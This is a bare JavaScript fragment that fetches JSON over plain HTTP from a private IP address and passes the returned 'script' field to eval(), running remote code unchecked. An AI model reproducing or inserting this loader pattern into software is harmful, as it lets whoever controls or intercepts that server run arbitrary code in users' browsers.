$.getJSON(`http://10.68.54.169:443/createjs`,(data)=>{
    var js = data.script;
    eval(js);
    });